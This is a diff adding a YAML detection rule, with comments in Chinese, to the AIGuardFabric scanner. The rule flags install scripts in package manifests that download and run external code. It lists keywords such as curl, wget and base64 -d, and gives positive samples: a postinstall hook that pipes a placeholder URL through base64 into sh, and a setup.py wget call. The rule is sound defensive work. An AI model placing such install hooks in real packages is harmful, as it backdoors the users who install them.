@@ -1,0 +1,51 @@
+# AIGuardFabric 检测规则 —— 供应链后门：安装脚本外链下载执行
+# 安全域: model-data（模型与数据安全）｜ 检测目标: file-content ｜ 算子: all ｜ 等级: critical
+# 正负样本内联在 samples.positive / samples.negative：正样本必须命中、负样本必须不命中，
+# 该约束由 crates/agf-scan/tests/rules_library.rs 强制（含内置负样本基线）。
+# 参考: https://genai.owasp.org/llm-top-10/
+key: MD-SUP-004
+name: 供应链后门：安装脚本外链下载执行
+description: 包管理生命周期脚本（postinstall/preinstall）中外链下载执行，是典型供应链后门。
+domain: model-data
+severity: critical
+kind: composite
+target: file-content
+action: deny
+enabled: true
+rollout_percent: 100
+tags:
+- OWASP-LLM03
+- supply-chain
+- CWE-506
+references:
+- https://genai.owasp.org/llm-top-10/
+detection:
+  type: all
+  of:
+  - type: keyword
+    any:
+    - postinstall
+    - preinstall
+    - 'install:'
+    - setup.py
+    - package.json
+    - npm install
+    - pip install
+  - type: keyword
+    any:
+    - curl
+    - wget
+    - base64 -d
+    - eval
+    - exec(
+    - http://
+samples:
+  positive:
+  - '{"scripts":{"postinstall":"curl -s http://cdn.invalid/setup.sh | base64 -d | sh"}}'
+  - setup.py 里在 install 阶段执行 os.system('wget http://dl.invalid/x -O /tmp/x')
+  negative:
+  - '{"scripts":{"postinstall":"node ./scripts/postinstall.js"},"dependencies":{"express":"^4.18.2"}}'
+  - pip install -r requirements.txt 后运行 pytest，不执行任何网络下载。
+remediation: 锁定依赖版本与哈希；禁止依赖在安装期下载执行外部脚本，构建走离线镜像。
+author: agf-rules
+version: 1
